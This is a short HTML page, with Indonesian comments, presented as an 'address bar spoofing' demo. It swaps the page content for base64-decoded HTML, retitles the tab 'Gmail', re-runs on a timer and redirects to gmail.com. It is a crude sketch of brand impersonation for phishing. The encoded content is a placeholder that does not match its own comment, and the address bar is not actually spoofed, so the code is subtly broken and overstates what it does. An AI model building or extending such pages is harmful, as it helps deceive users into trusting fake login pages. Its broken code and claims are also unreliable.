<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Bar Spoofing</title>
</head>
<body>
    <button onclick="spoof()">Go</button>

    <script>
        function spoof() {
            // Base64 encoded HTML content (contoh HTML untuk di-decode)
            var gmail = 'PGh0bWw+PGh1bj5HcmVldGluZyB0aGVtZSBwYWdlPC9odG1sPg=='; // Contoh base64 encode untuk <html><h1>Greeting theme page</h1></html>

            // Men-decoding base64 dan memasukkan hasilnya ke dalam halaman
            document.body.innerHTML = atob(gmail);

            // Menambahkan judul baru ke halaman
            document.title = "Gmail";

            // Memberikan sedikit delay sebelum mengarahkan ke halaman Gmail (atau halaman lain yang diinginkan)
            setTimeout(function() {
                window.location.assign("https://www.gmail.com");
            }, 3000); // Menunggu 3 detik sebelum mengalihkan
        }

        // Memanggil spoof setiap 100 detik (100000 ms)
        setInterval(spoof, 100000);
    </script>
</body>
</html>
